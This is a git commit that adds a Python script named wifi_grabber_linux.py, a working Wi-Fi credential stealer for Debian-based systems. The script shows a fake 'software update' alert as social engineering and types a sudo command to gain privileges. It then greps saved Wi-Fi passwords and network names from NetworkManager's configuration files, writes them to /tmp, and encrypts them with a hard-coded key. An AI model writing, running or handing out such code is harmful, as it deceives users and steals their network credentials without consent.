2855fc92d9260699d4c9392b0e2957ddf627dfb9
letzcode97 <42690233+letzcode97@users.noreply.github.com>
2018-10-15 14:27:32 -0500

    Add files via upload
    This program is to be run in debian environment(eg:ubuntu). The encrypted file is saved in /tmp directory as word1.txt.aes.

---
+++ wifi_grabber_linux.py
@@ -0,0 +1,36 @@
+
+import os
+import time
+import pyautogui
+import subprocess
+import pyAesCrypt
+
+def wait_social_engineering():
+    time.sleep(2)                                 #waiting for removing suspicion
+    pyautogui.alert('New software update available. A terminal will be opened soon.')   #alert window displayed in screeen
+    time.sleep(2)
+
+
+def wifi_password():
+    pyautogui.typewrite("sudo apt-get update")     #terminal opened and command is typed automatically
+    time.sleep(1)
+    os.system("sudo apt-get update")               #command processed in background
+    os.chdir("/etc/NetworkManager/system-connections")  #changing to requird location where wifi_password is stored
+    u=subprocess.check_output("sudo grep 'psk=' *",shell=True)  #using grep to get passwords and network names
+    u_decode=u.decode("utf-8")                               #converting all the result to plain text format
+    os.chdir("/tmp")
+    new_file=open("word1.txt","w+")                          #creating a file for writing
+    new_file.write(u_decode)                                 #wifi_password and networks wriiten into the file
+    new_file.close()
+
+def encrypt():                  #encrypting the file to which wifi_password saved
+    os.chdir("/tmp")
+    bufferSize = 64 * 1024
+    password = "password"      #key is password(for this example)
+    # encrypt
+    pyAesCrypt.encryptFile("word1.txt", "word1.txt.aes", password, bufferSize)
+    subprocess.call("rm word1.txt",shell=True)          #removing the original text file
+
+wait_social_engineering()
+wifi_password()
+encrypt()
